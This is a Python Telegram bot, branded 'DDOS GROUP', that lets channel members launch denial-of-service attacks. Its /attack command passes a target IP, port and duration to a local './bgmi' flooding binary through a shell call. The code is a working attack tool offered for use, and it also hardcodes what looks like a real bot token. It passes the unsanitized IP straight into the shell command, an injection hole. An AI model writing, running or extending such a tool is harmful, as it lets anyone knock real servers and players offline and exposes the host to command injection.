import os
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import BadRequest
from telegram.constants import ChatMemberStatus

# Replace with your bot token
TELEGRAM_BOT_TOKEN = '7735159098:AAHB_Gb97ItiyiYqf2FEAnQeZYaAH6pntBI'

# Predefined list of authorized group IDs
AUTHORIZED_GROUPS = {-1002217782523, -4717032044}  # Add your group IDs here

# Channel details
CHANNEL_ID = -1002356645682  # Replace with your channel's numeric ID
CHANNEL_LINK = "https://t.me/ultra_botss"  # Replace with your channel's link

# Track active attacks (maximum 2 concurrent attacks)
active_attacks = []

# Blocked ports list
BLOCKED_PORTS = {22, 25, 80, 443}  # Add blocked ports here

# Check if the group is authorized
def is_group_authorized(chat_id):
    return chat_id in AUTHORIZED_GROUPS

# Background function to check if the user is a member of the channel
async def is_user_in_channel(user_id, context: CallbackContext):
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR)
    except BadRequest:
        return False

# Check if the user is the channel owner
async def is_user_channel_owner(user_id, context: CallbackContext):
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status == ChatMemberStatus.OWNER
    except BadRequest:
        return False

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check group authorization
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="Unauthorized group.")
        return

    # Check if user is in the channel
    if not await is_user_in_channel(user_id, context):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("JOIN", url=CHANNEL_LINK)]
        ])
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You are not a member of our channel. Please join to use this bot.",
            reply_markup=keyboard
        )
        return

    message = (
        "*😉 Welcome to DDOS GROUP*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! 💀*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command: Run Attack
async def run_attack(chat_id, ip, port, duration, context, attack_id):
    global active_attacks
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 5",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        active_attacks.remove(attack_id)  # Remove attack from active list
        await context.bot.send_message(chat_id=chat_id, text="*Attack Completed!*", parse_mode='Markdown')

# Command: Attack
async def attack(update: Update, context: CallbackContext):
    global active_attacks
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check group authorization
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="Unauthorized group.")
        return

    # Check if user is in the channel
    if not await is_user_in_channel(user_id, context):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("JOIN", url=CHANNEL_LINK)]
        ])
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You are not a member of our channel. Please join to use this bot.",
            reply_markup=keyboard
        )
        return

    if len(active_attacks) >= 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Too many attacks running. Try again later.", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Use: /attack <ip> <port> <duration>", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Check if the port is blocked
    try:
        port = int(port)
        if port in BLOCKED_PORTS:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Port {port} is blocked. Please choose a valid port.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid port. Please enter a number.", parse_mode='Markdown')
        return

    try:
        duration = int(duration)
        if duration > 180:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ Maximum duration is 180 seconds.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid duration. Please enter a number.", parse_mode='Markdown')
        return

    # Track the new attack
    attack_id = f"{ip}:{port}:{duration}"
    active_attacks.append(attack_id)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*💀 Attack Launched!*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battle begin! 🔥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, attack_id))

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
